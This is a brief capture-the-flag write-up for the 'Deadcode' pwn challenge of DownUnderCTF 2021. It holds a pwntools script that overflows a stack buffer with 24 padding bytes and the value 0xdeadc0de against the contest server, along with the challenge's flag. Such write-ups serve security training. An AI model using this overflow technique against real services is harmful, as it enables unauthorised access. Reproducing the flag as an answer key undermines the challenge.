# Deadcode
>I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.


>Author: xXl33t_h@x0rXx

>nc pwn-2021.duc.tf 31916

[Deadcode](https://drive.google.com/file/d/1yZbYUURFfaBssl4LK7UaCUftya2-NQCy/view?usp=sharing)

## Solution 

```
from pwn import *

p = remote('pwn-2021.duc.tf',31916)


buff = "A"*24

payload = buff
payload += p64(0xdeadc0de)

p.sendline(payload)
p.interactive()
```

> Flag: `DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`
